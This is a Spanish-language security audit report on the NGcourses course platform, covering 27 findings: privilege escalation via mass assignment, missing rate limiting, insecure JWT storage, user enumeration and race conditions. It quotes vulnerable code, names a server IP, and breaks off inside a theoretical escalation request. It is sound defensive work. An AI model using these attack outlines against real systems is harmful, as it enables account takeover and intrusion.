# NGcourses — Auditoría de Seguridad

**Fecha:** 2026-05-09
**Versión auditada:** rama `main`, commit `3d1818e` (HEAD al momento de la auditoría)
**Auditor:** Claude Opus 4.7 (auditoría asistida)
**Alcance:** frontend Next.js 16 + backend FastAPI + configuración (Docker, CI/CD, secretos declarados)
**Tipo de auditoría:** Estática (sin pentesting activo, sin ejecución de `npm audit`/`pip audit` automatizado)

---

## 1. Resumen Ejecutivo

### 1.1 Veredicto general

NGcourses presenta una **postura de seguridad intermedia con varios hallazgos críticos pre-producción**. El proyecto demuestra buenas prácticas en áreas tradicionalmente complejas (uso correcto de SQLModel sin SQL injection, bcrypt para passwords, OIDC en CI/CD, sin deserialización insegura, validación HMAC de webhooks Bunny). Sin embargo, **existen tres hallazgos críticos** (mass assignment con escalada vertical, ausencia total de rate limiting, JWT en `localStorage`) y **ocho hallazgos altos** que deben resolverse antes del despliegue a producción real, especialmente en un sistema con datos personales de alumnos y procesamiento de pagos.

La **deuda técnica de seguridad ya está parcialmente reconocida** por el equipo (`README.md` y comentarios `SECURITY TODO` en `auth.ts`), lo que indica madurez del equipo y una hoja de ruta inicial. Esta auditoría formaliza, prioriza y completa esa lista.

### 1.2 Conteo de hallazgos por severidad

| Severidad | Cantidad | IDs |
|---|---|---|
| Crítico (CVSS 9.0–10.0) | 3 | FND-001, FND-002, FND-003 |
| Alto (CVSS 7.0–8.9) | 8 | FND-004 a FND-011 |
| Medio (CVSS 4.0–6.9) | 9 | FND-012 a FND-020 |
| Bajo (CVSS 0.1–3.9) | 7 | FND-021 a FND-027 |
| **Total** | **27** | |

### 1.3 Top 5 acciones P0 (orden recomendado)

1. **Excluir `is_superuser`, `rol`, `is_active` de `UserUpdate`** (FND-001) — el código actual permite a cualquier admin escalar a superusuario o cambiar roles vía `PATCH /users/{id}`. Cambio mínimo, impacto máximo.
2. **Agregar rate limiting** en `/login/access-token`, `/password-recovery/{email}`, `/users/signup`, `/users/activar`, `/reset-password/` (FND-002) — actualmente cualquier endpoint público es vulnerable a brute force / enumeration.
3. **Migrar JWT a HttpOnly + Secure + SameSite=Strict cookies** (FND-003) — eliminar `localStorage.setItem('access_token', ...)`. Requiere que el backend emita la cookie en `/login/access-token`.
4. **Agregar middleware server-side en Next.js** (`middleware.ts` real, no `proxy.ts` muerto) (FND-005) — la validación de rol actual ocurre solo en `useEffect` del cliente, fácilmente evadible.
5. **Agregar headers de seguridad** (CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy) (FND-008) — defensa en profundidad ausente; aplica tanto en `next.config.ts` como en middleware FastAPI.

---

## 2. Fase 1 — Reconocimiento

### 2.1 Stack tecnológico

| Capa | Tecnología | Versión |
|---|---|---|
| Frontend framework | Next.js (App Router) | 16.1.4 |
| Frontend lib | React | 19.2.3 |
| Lenguaje frontend | TypeScript | ^5 |
| Estilos | CSS Modules + variables CSS (sin Tailwind en admin/supervisor) | — |
| Backend framework | FastAPI | >=0.114.2,<1.0.0 |
| Lenguaje backend | Python | >=3.10,<4.0 |
| ORM | SQLModel (sobre SQLAlchemy 2.x) | >=0.0.21 |
| Base de datos | PostgreSQL | 17 (dev) / RDS (prod) |
| Autenticación | JWT (HS256) + bcrypt | PyJWT >=2.8.0, bcrypt ==4.3.0 |
| Migraciones | Alembic | >=1.12.1 |
| Email | Resend (primario) / SMTP (fallback) | resend >=2.0.0 |
| Pagos | PayPal (sandbox + live) | @paypal/react-paypal-js ^9.2.0 |
| Video CDN | Bunny.net (TUS upload) | tus-js-client ^4.3.1 |
| PDFs (certificados) | reportlab | >=4.2.0 |
| Monitoreo | sentry-sdk (backend) | >=1.40.6 |
| Reverse proxy | Traefik 3.0 + Let's Encrypt | — |
| CI/CD | GitHub Actions + AWS ECR + EC2 | — |
| Gestor paquetes | npm workspaces (frontend) + uv (backend) | — |

### 2.2 Puntos de entrada

**Backend FastAPI** — 18 routers, ~80+ endpoints. Públicos (sin auth):
- `POST /api/v1/login/access-token` — login con OAuth2PasswordRequestForm
- `POST /api/v1/password-recovery/{email}` — solicita reset de contraseña
- `POST /api/v1/reset-password/` — confirma reset con token
- `POST /api/v1/users/signup` — registro abierto
- `POST /api/v1/users/activar` — activación de cuenta empresarial con token
- `POST /api/v1/users/solicitar-reactivacion` — re-envío de token de activación
- `POST /api/v1/invitaciones/canjear` — canje de invitación a curso
- `POST /api/v1/webhooks/bunny` — webhook de Bunny.net (validación HMAC)

**Frontend Next.js** — App Router. Páginas públicas: `/`, `/forgot-password`, `/reset-password`, `/activar`, `/invitacion`. Páginas autenticadas agrupadas en `/admin/*`, `/instructor/*`, `/supervisor/*`, `/mis-cursos`, `/curso/[id]`, `/perfil`. Route handlers:
- [frontend/src/app/api/[...path]/route.ts](frontend/src/app/api/[...path]/route.ts) — proxy genérico al backend (forwarda todos los métodos y headers excepto `host`).
- [frontend/src/app/media/[...path]/route.ts](frontend/src/app/media/[...path]/route.ts) — proxy GET-only a `/media/*`.

### 2.3 Capas de autenticación, autorización y manejo de sesiones

- **Autenticación:** JWT HS256 firmado con `settings.SECRET_KEY` ([backend/app/core/security.py:18](backend/app/core/security.py#L18)). Expiración de 8 días ([backend/app/core/config.py:36](backend/app/core/config.py#L36)). Sin refresh token.
- **Hashing de passwords:** bcrypt vía `passlib.context.CryptContext(schemes=["bcrypt"])` con rounds default ([backend/app/core/security.py:9](backend/app/core/security.py#L9)).
- **RBAC backend:** dependencies en [backend/app/api/deps.py](backend/app/api/deps.py) — `CurrentUser`, `AdminOrSuperuser`, `InstructorOrAbove`, `SupervisorOrAbove`. Roles definidos en `RolUsuario` enum.
- **Persistencia cliente:** token en `localStorage` + cookies espejo (`access_token`, `user_rol`, `user_superuser`) sin `HttpOnly` ni `Secure`, con `SameSite=Lax` ([frontend/src/lib/auth.ts:32-54](frontend/src/lib/auth.ts#L32-L54)).
- **Validación de rutas frontend:** **solo cliente** vía `useEffect` en cada layout ([frontend/src/components/admin/AdminLayout.tsx:20-37](frontend/src/components/admin/AdminLayout.tsx#L20-L37)). Existe `frontend/src/proxy.ts` con la lógica correcta, pero **es código muerto** — no hay `middleware.ts` real registrado.

### 2.4 Manejo de uploads, archivos estáticos y recursos externos

- **Imagen de portada de curso** (`POST /cursos/{id}/cover`): valida MIME contra `{jpeg,png,webp,gif}`, tamaño máx 5MB, nombre saneado a `{curso_id}.{ext}` → previene path traversal. Almacenamiento `/app/app/media/covers/`. **Falta validación de magic bytes** ([backend/app/api/routes/cursos.py:282-321](backend/app/api/routes/cursos.py#L282-L321)).
- **Recursos de lección** (`POST /cursos/.../recursos/upload`): valida sólo extensión (no MIME, no magic bytes), tamaño máx 20MB, nombre saneado a `{uuid}.{ext}` ([backend/app/api/routes/cursos.py:754-790](backend/app/api/routes/cursos.py#L754-L790)).
- **Video upload** (Bunny.net TUS): el backend genera URL+headers TUS firmados; el cliente sube directo a `https://video.bunnycdn.com/tusupload`. Sin validación de tamaño total en cliente.
- **Sirve estáticos** vía `app.mount("/media", StaticFiles(directory=MEDIA_DIR))` ([backend/app/main.py:49](backend/app/main.py#L49)) si `SERVE_MEDIA != "false"`. En prod recomendado servir vía nginx/CloudFront.
- **Recursos externos:** Bunny.net y PayPal con URLs hardcoded ([backend/app/services/](backend/app/services/)) — **no hay SSRF**: ninguna URL es controlada por usuario.

### 2.5 Diagrama de arquitectura (resumen ASCII)

```
                  ┌──────────────────────────────────────────┐
                  │   Internet                               │
                  └─────────────────┬────────────────────────┘
                                    │  HTTPS (Let's Encrypt)
                                    ▼
                  ┌──────────────────────────────────────────┐
                  │   Traefik 3.0 (reverse proxy)            │
                  └─────┬─────────────────────┬──────────────┘
                        │                     │
                        ▼                     ▼
              ┌────────────────┐    ┌────────────────────┐
              │ Next.js        │    │ FastAPI            │
              │ (frontend)     │◄──►│ (backend)          │
              │ App Router     │    │ /api/v1/*          │
              │ proxy /api/*   │    │ /media/*           │
              └────────┬───────┘    └─────────┬──────────┘
                       │                      │
       localStorage ◄──┘                      ├──► PostgreSQL (RDS prod)
       cookies                                ├──► Bunny.net (videos, TUS)
       JWT (HS256)                            ├──► PayPal (sandbox/live)
                                              ├──► Resend / SMTP (email)
                                              └──► Sentry (errores backend)
```

---

## 3. Fase 2 — Análisis de Vulnerabilidades

> **Convención:** cada hallazgo (FND-XXX) referencia OWASP Top 10 2021 y CWE. La sección 4 contiene PoC + CVSS v3.1, la sección 5 contiene remediación.

### Críticos

#### FND-001 — Mass assignment con escalada vertical en `PATCH /users/{user_id}`

- **Categoría:** Broken Access Control (OWASP A01:2021) / Mass Assignment
- **CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
- **Ubicación:** [backend/app/models/user.py:42-45](backend/app/models/user.py#L42-L45) (schema), [backend/app/api/routes/users.py:222-251](backend/app/api/routes/users.py#L222-L251) (endpoint)
- **Descripción:** El schema `UserUpdate(UserBase)` hereda **todos** los campos de `UserBase`, incluyendo `is_superuser`, `is_active`, `rol`, `estado`, sin excluirlos explícitamente. El endpoint `PATCH /users/{id}` (protegido por `require_admin_or_superuser`) acepta `UserUpdate` y delega a `crud.update_user`, que aplica todos los campos vía `sqlmodel_update`. A diferencia de `POST /users/` (línea 81-85), aquí **no hay verificación** que impida que un admin no-superuser otorgue `is_superuser=true` a sí mismo o a otro usuario.

  **Evidencia ([backend/app/models/user.py:17-44](backend/app/models/user.py#L17-L44)):**
  ```python
  class UserBase(SQLModel):
      email: EmailStr = Field(unique=True, index=True, max_length=255)
      is_active: bool = True
      is_superuser: bool = False           # ⚠️ heredado por UserUpdate
      full_name: str | None = ...
      rol: RolUsuario = Field(default=RolUsuario.ESTUDIANTE, ...)  # ⚠️
      estado: EstadoUsuario = ...           # ⚠️
      # ...

  class UserUpdate(UserBase):
      email: EmailStr | None = ...
      password: str | None = ...
      # is_superuser, rol, estado quedan editables
  ```

  Esto convierte cualquier compromiso de cuenta admin (vía phishing, XSS o el FND-002/FND-003) en escalada total a superusuario.

#### FND-002 — Ausencia de rate limiting en endpoints públicos sensibles

- **Categoría:** Identification & Authentication Failures (OWASP A07:2021)
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-799 (Improper Control of Interaction Frequency)
- **Ubicación:** [backend/app/api/routes/login.py:24-43](backend/app/api/routes/login.py#L24-L43) (login), [login.py:54-83](backend/app/api/routes/login.py#L54-L83) (recovery), [login.py:86-109](backend/app/api/routes/login.py#L86-L109) (reset), [users.py:188-201](backend/app/api/routes/users.py#L188-L201) (signup), [users.py:336-357](backend/app/api/routes/users.py#L336-L357) (activar), [users.py:360-380](backend/app/api/routes/users.py#L360-L380) (solicitar-reactivacion)
- **Descripción:** No existe rate limiter ni middleware equivalente (slowapi, fastapi-limiter, redis-limits) en ningún endpoint del proyecto. Esto expone:
  - **Brute force de contraseñas** en `/login/access-token` (sin lockout, sin captcha, sin backoff).
  - **User enumeration** en `/password-recovery/{email}` (responde 404 explícito si el email no existe — ver FND-004).
  - **Brute force de tokens de 32 bytes** en `/reset-password/`, `/users/activar`, `/invitaciones/canjear`. Aunque el espacio de búsqueda es enorme, la ausencia de límite permite intentos masivos sin detección.
  - **Spam de signup** en `/users/signup` (sin captcha, sin email verification, sin throttle).
  - **Email bombing** vía `/password-recovery/{email}` o `/users/solicitar-reactivacion` (cada request manda un email real al usuario destino).

#### FND-003 — JWT en `localStorage` y cookies sin `HttpOnly`/`Secure`

- **Categoría:** Sensitive Data Exposure / Session Management (OWASP A02:2021, A07:2021)
- **CWE:** CWE-922 (Insecure Storage of Sensitive Information), CWE-1004 (Sensitive Cookie Without 'HttpOnly')
- **Ubicación:** [frontend/src/lib/auth.ts:32-35](frontend/src/lib/auth.ts#L32-L35), [auth.ts:53-54](frontend/src/lib/auth.ts#L53-L54)
- **Descripción:** El access token JWT se persiste en `localStorage` y simultáneamente en cookies del lado cliente con flags inseguros:
  ```typescript
  localStorage.setItem(TOKEN_KEY, token);
  document.cookie = `${TOKEN_KEY}=${token}; path=/; SameSite=Lax`;       // sin HttpOnly, sin Secure
  document.cookie = `user_rol=${user.rol}; path=/; SameSite=Lax`;         // legible/falsificable
  document.cookie = `user_superuser=${user.is_superuser ? '1' : '0'}; ...`;
  ```
  Cualquier vector XSS (incluso uno menor en una página pública) → exfiltración del JWT → toma de cuenta. La duración de 8 días (FND-007) amplifica el daño. Las cookies `user_rol` y `user_superuser` son **falsificables desde el cliente** y se usan como input al middleware muerto en `proxy.ts` (FND-005).

  El equipo ya reconoce este riesgo en el comentario `SECURITY TODO (ISO 25010 §6.7)` en [auth.ts:29-31](frontend/src/lib/auth.ts#L29-L31).

### Altos

#### FND-004 — User enumeration en `/password-recovery/{email}`

- **Categoría:** Identification & Authentication Failures (OWASP A07:2021)
- **CWE:** CWE-204 (Observable Response Discrepancy)
- **Ubicación:** [backend/app/api/routes/login.py:54-65](backend/app/api/routes/login.py#L54-L65)
- **Descripción:** El endpoint responde **HTTP 404 con `detail="The user with this email does not exist in the system."`** si el email no existe, vs. 200 si existe. Esto permite a un atacante enumerar usuarios masivamente. Compárese con `/users/solicitar-reactivacion` ([users.py:367-368](backend/app/api/routes/users.py#L367-L368)) que **sí** implementa la respuesta uniforme correcta ("Si el correo existe ..."). El equipo conoce el patrón correcto pero no lo aplicó aquí.

#### FND-005 — Sin protección server-side de rutas en frontend

- **Categoría:** Broken Access Control (OWASP A01:2021)
- **CWE:** CWE-602 (Client-Side Enforcement of Server-Side Security)
- **Ubicación:** [frontend/src/proxy.ts](frontend/src/proxy.ts) (código muerto), [frontend/src/components/admin/AdminLayout.tsx:20-37](frontend/src/components/admin/AdminLayout.tsx#L20-L37)
- **Descripción:** Existe `frontend/src/proxy.ts` con lógica correcta de validación de rol vía cookies, **pero el archivo no se llama `middleware.ts`** y por lo tanto Next.js nunca lo invoca. La única validación real ocurre en `useEffect` de cada layout: el render se ejecuta sin restricción y solo después se redirige al login. Atacante puede:
  1. Construir directamente la URL `/admin/usuarios/[id]/editar` y hacer scraping del HTML inicial antes del redirect.
  2. Bypass total invocando los endpoints de la API directamente con un JWT robado (la API valida correctamente; el problema es UX y reconocimiento).

  Adicionalmente, las cookies `user_rol`/`user_superuser` que `proxy.ts` lee son **fácilmente falsificables** porque no son `HttpOnly` (FND-003).

#### FND-006 — `SECRET_KEY=changethis` aceptado en `local` con sólo warning

- **Categoría:** Cryptographic Failures (OWASP A02:2021)
- **CWE:** CWE-798 (Use of Hard-coded Credentials), CWE-1188 (Insecure Default Initialization)
- **Ubicación:** [backend/app/core/config.py:130-144](backend/app/core/config.py#L130-L144)
- **Descripción:** El validador `_check_default_secret` solo emite `warnings.warn` si `ENVIRONMENT == "local"`. En desarrollo es habitual que el SECRET_KEY=`changethis` y los tokens JWT firmados con esa clave sean **predecibles entre desarrolladores**. Combinado con el hecho de que `.env` se versiona en GitHub (Git history podría haber tenido valores reales), un atacante con acceso a la red interna o que comprometa una cuenta dev puede forjar JWTs arbitrarios. Adicionalmente, `SECRET_KEY: str = secrets.token_urlsafe(32)` como default ([config.py:34](backend/app/core/config.py#L34)) implica que **si alguien reinicia el backend sin .env, todos los JWTs emitidos antes quedan invalidados o, peor, los nuevos se firman con clave aleatoria que podría persistir solo en memoria**.

#### FND-007 — Expiración JWT de 8 días sin refresh token ni rotación

- **Categoría:** Identification & Authentication Failures (OWASP A07:2021)
- **CWE:** CWE-613 (Insufficient Session Expiration)
- **Ubicación:** [backend/app/core/config.py:35-36](backend/app/core/config.py#L35-L36)
- **Descripción:** `ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24 * 8` (11,520 minutos = 8 días). Una vez emitido, el JWT no puede ser revocado (no hay denylist, no hay versión por usuario en el payload). Un token robado vía FND-003 mantiene acceso completo durante una semana laboral entera, suficiente para cualquier atacante.

#### FND-008 — Ausencia total de headers de seguridad

- **Categoría:** Security Misconfiguration (OWASP A05:2021)
- **CWE:** CWE-693 (Protection Mechanism Failure), CWE-1021 (Improper Restriction of Rendered UI Layers)
- **Ubicación:** [frontend/next.config.ts](frontend/next.config.ts) (sin `headers()`), [backend/app/main.py](backend/app/main.py) (sin middleware de headers)
- **Descripción:** Ningún header de seguridad está configurado:
  - `Content-Security-Policy` — defensa principal contra XSS, ausente.
  - `X-Frame-Options: DENY` o `frame-ancestors 'none'` — clickjacking posible (relevante porque hay panel admin).
  - `X-Content-Type-Options: nosniff` — MIME sniffing posible.
  - `Strict-Transport-Security` — HSTS no fija, MITM en primera visita posible.
  - `Referrer-Policy: strict-origin-when-cross-origin` — leak de URLs internas.
  - `Permissions-Policy` — no se restringen geolocation, camera, microphone.

#### FND-009 — Race condition (TOCTOU) en emisión de certificados

- **Categoría:** Concurrency / Race Condition (OWASP A04:2021)
- **CWE:** CWE-367 (Time-of-check Time-of-use), CWE-362 (Concurrent Execution using Shared Resource)
- **Ubicación:** [backend/app/crud.py:585-609](backend/app/crud.py#L585-L609) (función `check_and_emit_certificate`)
- **Descripción:** El check "¿ya existe certificado?" y la creación del certificado no son atómicos:
  ```python
  existing = session.exec(
      select(Certificado).where(Certificado.inscripcion_id == inscripcion_id)
  ).first()
  if existing:
      return existing
  # Generar folio único
  folio = f"NG-{secrets.token_hex(FOLIO_TOKEN_BYTES).upper()}"
  certificado = Certificado(...)
  session.add(certificado)
  session.commit()
  ```
  Dos requests concurrentes (e.g. el usuario envía la última lección dos veces, o un webhook de progreso simultáneo) pueden pasar el check ambos y generar dos certificados con folios distintos para la misma inscripción. Si la tabla `Certificado` no tiene un índice `UNIQUE` sobre `inscripcion_id` en BD, la corrupción es persistente. **Validar:** revisar la migración Alembic `1a11599a9554_initial_schema` para confirmar/agregar el unique constraint.

#### FND-010 — Race condition en `confirmar_pago` (pago + inscripción no atómicos)

- **Categoría:** Business Logic / Race Condition
- **CWE:** CWE-362
- **Ubicación:** [backend/app/api/routes/pagos.py:130-190](backend/app/api/routes/pagos.py#L130-L190)
- **Descripción:** El flujo "marcar pago COMPLETADO → crear inscripción" no se ejecuta dentro de una transacción explícita:
  ```python
  pago = crud.update_pago_status(..., status=EstadoPago.COMPLETADO, ...)  # commit 1
  insc = crud.get_inscripcion_by_usuario_curso(...)
  if not insc:
      insc = crud.create_inscripcion(...)                                  # commit 2
  ```
  Si el proceso falla entre los dos commits (crash, OOM, deploy), queda un pago COMPLETADO sin inscripción asociada, y el alumno no obtiene acceso al curso aunque pagó. La idempotencia del check al inicio (`pago.status == COMPLETADO`) mitiga el caso de retries del cliente, pero no el caso de fallo intermedio del servidor. El mismo patrón aparece en `cortesia` ([pagos.py:228-266](backend/app/api/routes/pagos.py#L228-L266)).

#### FND-011 — IP pública de EC2 hardcodeada en workflow de GitHub Actions

- **Categoría:** Security Misconfiguration / Information Disclosure
- **CWE:** CWE-200 (Exposure of Sensitive Information)
- **Ubicación:** [.github/workflows/deploy.yml:86](.github/workflows/deploy.yml#L86), `:99`, `:101`, `:116`
- **Descripción:** La IP `44.250.178.54` aparece en cuatro líneas del workflow y queda visible en logs de GitHub Actions (potencialmente públicos si el repo se publica) y en `git log`. Aunque una IP por sí sola no es secreto, expone la superficie de ataque: un atacante puede ahora enfocar reconocimiento (Shodan, nmap a esa IP) y combinarlo con CVEs conocidos del SO/SSH. La misma IP también aparece en [frontend/next.config.ts:16](frontend/next.config.ts#L16) como `remotePattern` para imágenes — innecesario en producción.

### Medios

#### FND-012 — CORS con `allow_headers=["*"]` + `allow_credentials=True`

- **Categoría:** Security Misconfiguration (OWASP A05:2021)
- **CWE:** CWE-942 (Permissive Cross-domain Policy)
- **Ubicación:** [backend/app/main.py:33-40](backend/app/main.py#L33-L40)
- **Descripción:** `allow_origins` es restrictivo (whitelist explícita), lo que mitiga el riesgo principal. Sin embargo, `allow_headers=["*"]` combinado con `allow_credentials=True` permite que cualquier header personalizado sea enviado en requests con cookies — incrementa la superficie de ataque CSRF/header-injection si un origen permitido es comprometido (e.g. subdominio vulnerable). Adicionalmente, `allow_origin_regex=r"https://.*\.(loca\.lt|ngrok(-free)?\.app)$"` en `local` confía en cualquier subdominio de servicios de túnel, que pueden ser registrados por atacantes.

#### FND-013 — Validación MIME por header sin verificación de magic bytes

- **Categoría:** File Upload Vulnerabilities
- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-646 (Reliance on File Name or Extension)
- **Ubicación:** [backend/app/api/routes/cursos.py:297-298](backend/app/api/routes/cursos.py#L297-L298) (cover), [cursos.py:775-776](backend/app/api/routes/cursos.py#L775-L776) (recursos)
- **Descripción:** Cover acepta MIME types `{jpeg,png,webp,gif}` confiando en el header `Content-Type` (spoofeable por el cliente). Recursos de lección **ni siquiera validan MIME**, solo extensión. Un atacante puede subir un script o ejecutable renombrado a `.pdf` con `Content-Type: image/jpeg`. El riesgo se reduce porque los archivos se sirven desde `/media/` con `StaticFiles` (no se ejecutan), pero permite hospedar malware/phishing pages dentro del dominio confiable de NGcourses.

#### FND-014 — Token de reset password en URL query param

- **Categoría:** Sensitive Data Exposure
- **CWE:** CWE-598 (Information Exposure Through Query Strings in GET Request)
- **Ubicación:** [frontend/src/app/reset-password/page.tsx](frontend/src/app/reset-password/page.tsx) (consume `?token=...`)
- **Descripción:** El token de reset (32 bytes URL-safe) viaja en la URL. Las URLs se persisten en: historial del navegador, logs de proxies/CDNs intermedios, `Referer` headers (parcialmente mitigado por SameSite, pero no totalmente), capturas de pantalla compartidas. El reset es de un solo uso ([login.py:105-106](backend/app/api/routes/login.py#L105-L106)) y expira en 48h, lo que reduce el riesgo, pero no lo elimina.

#### FND-015 — Cookies con `SameSite=Lax` (no `Strict`)

- **Categoría:** CSRF
- **CWE:** CWE-352 (Cross-Site Request Forgery)
- **Ubicación:** [frontend/src/lib/auth.ts:35](frontend/src/lib/auth.ts#L35), `:53-54`
- **Descripción:** `SameSite=Lax` permite el envío de cookies en navegaciones top-level (`<a href>`, `window.location`), no solo en same-site. Esto deja una pequeña ventana de CSRF en endpoints `GET` con efectos secundarios. La aplicación parece usar `POST/PATCH` para mutaciones (correcto), pero `Strict` es siempre más seguro para sesiones administrativas.

#### FND-016 — Adminer expuesto en `docker-compose.yml` para producción

- **Categoría:** Security Misconfiguration
- **CWE:** CWE-1188 (Insecure Default Initialization), CWE-489 (Active Debug Code)
- **Ubicación:** [docker-compose.yml:22-43](docker-compose.yml#L22-L43)
- **Descripción:** El servicio `adminer` se expone en `adminer.${DOMAIN}` con TLS pero **sin autenticación HTTP básica configurada en este compose**. La protección queda íntegramente en manos de las credenciales de PostgreSQL. Si `POSTGRES_PASSWORD` es débil o se compromete (recordar default `changethis` en `.env.example`), un atacante puede ejecutar SQL arbitrario. Además, esto va en el compose principal — fácil de levantar accidentalmente en staging/producción. `docker-compose.prod.yml` no incluye Adminer, lo cual es correcto, pero el archivo de compose principal no debería incluir herramientas de debug.

#### FND-017 — Containers Docker corren como root (sin directiva `USER`)

- **Categoría:** Security Misconfiguration
- **CWE:** CWE-250 (Execution with Unnecessary Privileges)
- **Ubicación:** [backend/Dockerfile](backend/Dockerfile), [frontend/Dockerfile](frontend/Dockerfile)
- **Descripción:** Ningún Dockerfile define `USER`. En caso de RCE en la aplicación, el atacante obtiene `root` dentro del container. Combinado con un escape de container (CVE en runc, kernel) → comprometer el host. La imagen `node:20-alpine` ya provee el usuario `node`; la imagen `python:3.10` requiere crear un usuario dedicado.

#### FND-018 — Endpoint `private.py` activo si `ENVIRONMENT=local` mal configurado

- **Categoría:** Security Misconfiguration
- **CWE:** CWE-489 (Active Debug Code)
- **Ubicación:** [backend/app/api/routes/private.py](backend/app/api/routes/private.py)
- **Descripción:** Existe un router `private` que se activa solo en local (no auditado en detalle aquí). Si por error se despliega con `ENVIRONMENT=local` en producción (configuración default si `.env.prod` no se carga correctamente, FND-006), estos endpoints quedan expuestos. Defensa en profundidad: agregar verificación de `ENVIRONMENT` también dentro de cada endpoint, no solo en el include del router.

#### FND-019 — Comparación de `password_reset_expira` con `tzinfo=timezone.utc` forzado

- **Categoría:** Insecure Design / Logic Error
- **CWE:** CWE-754 (Improper Check for Unusual or Exceptional Conditions)
- **Ubicación:** [backend/app/api/routes/login.py:98](backend/app/api/routes/login.py#L98), [users.py:347](backend/app/api/routes/users.py#L347)
- **Descripción:** El código compara así:
  ```python
  if user.password_reset_expira is None or datetime.now(timezone.utc) > user.password_reset_expira.replace(tzinfo=timezone.utc):
  ```
  Si `password_reset_expira` se guardó con tzinfo (lo hace, ver línea 69), `replace(tzinfo=timezone.utc)` **descarta el tzinfo original y reasigna UTC** — si la BD almacenó como naive (PostgreSQL `TIMESTAMP WITHOUT TIME ZONE`) pero el campo Python lo trató con tzinfo aware al insertar, hay riesgo de mismatch de horas en algunos drivers. La verificación funciona en la práctica pero el patrón es frágil. Mejor: almacenar siempre con tzinfo (`TIMESTAMP WITH TIME ZONE`) y comparar directamente sin `replace`.

#### FND-020 — Frontend expuesto en HTTP puerto 80 en `docker-compose.prod.yml`

- **Categoría:** Sensitive Data in Transit
- **CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)
- **Ubicación:** [docker-compose.prod.yml:36-37](docker-compose.prod.yml#L36-L37)
- **Descripción:** El frontend mapea `"80:3000"` directamente al host. Si el reverse proxy externo (nginx/ALB) no fuerza HTTPS o falla, los usuarios ven HTTP plano y los JWT viajan en cleartext. Adicionalmente, sin TLS, `Secure` cookies (recomendación FND-003) no se envían. **Validar:** confirmar que delante de este puerto 80 hay un ALB de AWS con redirect HTTP→HTTPS forzado.

> **Estado (2026-05-18):** POSPUESTO — el proyecto aún no tiene dominio asignado (se usará un subdominio en ncchamp). Cuando el dominio esté activo: activar Traefik con Let's Encrypt (usar `docker-compose.traefik.yml` existente), cambiar `ENABLE_HTTPS=true` en `.env.prod`, y verificar que las cookies Secure y HSTS se envíen correctamente. El código ya está preparado para este cambio (`secure=settings.ENABLE_HTTPS` en cookies, `httpsEnabled` en CSP).

### Bajos

#### FND-021 — Ausencia de validación con schemas (zod/yup) en el frontend

- **Categoría:** Insufficient Input Validation
- **CWE:** CWE-20 (Improper Input Validation)
- **Ubicación:** Toda la capa de formularios.
- **Descripción:** El backend valida con Pydantic (defensa correcta), pero el frontend solo aplica validaciones HTML5 + checks ad-hoc de longitud. No es vulnerabilidad explotable, pero implica que errores de validación viajan al servidor antes de detectarse, deteriora UX y representa defensa-en-profundidad ausente.

#### FND-022 — Sin DOMPurify ni sanitización dedicada

- **Categoría:** XSS prevention
- **CWE:** CWE-79
- **Ubicación:** Frontend completo.
- **Descripción:** Actualmente **no se encontró ningún uso de `dangerouslySetInnerHTML`, `eval`, `innerHTML` o `Function()`** en el frontend, así que el riesgo XSS está controlado por React por construcción. Es un hallazgo preventivo: si en el futuro se agrega rich text editing (descripción de cursos, comentarios), DOMPurify debe instalarse antes.

#### FND-023 — `SECURITY.md` con template genérico de @tiangolo (no adaptado)

- **Categoría:** Process Failure
- **CWE:** N/A (operacional)
- **Ubicación:** [SECURITY.md](SECURITY.md)
- **Descripción:** El archivo dirige reportes de vulnerabilidades a `security@tiangolo.com` (autor del template upstream), no al equipo de NGcourses. Reportes de seguridad responsables se perderán o llegarán al destinatario equivocado.

#### FND-024 — Sin pre-commit hooks (gitleaks/detect-secrets)

- **Categoría:** Process / Secret Management
- **CWE:** CWE-540 (Inclusion of Sensitive Information in Source Code)
- **Ubicación:** Raíz del repo (sin `.pre-commit-config.yaml`).
- **Descripción:** No hay hooks que escaneen secretos antes del commit. El `.gitignore` ignora `.env`, pero un desarrollador puede pegar credenciales en otro archivo accidentalmente (e.g. tests, README de PR draft).

#### FND-025 — Logger frontend sin servicio externo (Sentry u otro)

- **Categoría:** Insufficient Logging & Monitoring (OWASP A09:2021)
- **CWE:** CWE-778 (Insufficient Logging)
- **Ubicación:** [frontend/src/lib/logger.ts](frontend/src/lib/logger.ts) (logger simple a console)
- **Descripción:** El backend tiene Sentry configurado ([main.py:18-19](backend/app/main.py#L18-L19)). El frontend no, lo que significa que errores que ocurran solo en el navegador del usuario (XSS, fallas de fetch, errores de UI con datos PII) son invisibles para el equipo. La detección y respuesta a incidentes es ciega del lado cliente.

#### FND-026 — `package-lock.json` listado en `.gitignore` raíz pero commiteado

- **Categoría:** Process / Configuration Drift
- **CWE:** N/A
- **Descripción:** Inconsistencia: el archivo está versionado (correcto para builds reproducibles) pero el `.gitignore` lo lista. Confunde a colaboradores y puede provocar omisión accidental.

#### FND-027 — Frontend Dockerfile copia `.env*` si existe (`COPY . .`)

- **Categoría:** Sensitive Data in Image
- **CWE:** CWE-538 (Insertion of Sensitive Information into Externally-Accessible File)
- **Ubicación:** [frontend/Dockerfile:9](frontend/Dockerfile#L9)
- **Descripción:** En el stage `builder`, `COPY . .` copia todo el contexto de build, incluyendo `.env.local` si existe en el contexto local del developer ejecutando `docker build`. En CI/CD esto no aplica (el checkout del runner no tiene `.env.local`), pero un developer haciendo build local puede embeber sus credenciales en la imagen. Mitigación: agregar `.dockerignore` con `.env*`.

---

## 4. Fase 3 — Explotación Teórica (PoC) y CVSS v3.1

> **Notación CVSS:** AV=Attack Vector, AC=Attack Complexity, PR=Privileges Required, UI=User Interaction, S=Scope, C=Confidentiality, I=Integrity, A=Availability.

### FND-001 — Mass assignment con escalada vertical

- **CVSS v3.1:** `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` → **Score 9.1 (Crítico)**
- **Justificación:** Network (admin API expuesta), AC bajo (request HTTP estándar), PR alto (requiere admin), sin UI. Scope changed porque crear superusuarios afecta más allá del componente vulnerable. Impacto C/I/A altos: superusuario puede leer todo, modificar todo, borrar todo.
- **PoC teórica:** Un admin no-superuser con sesión válida envía:
  ```
  PATCH /api/v1/users/{su_propio_id}
  Authorization: Bearer <admin JWT>
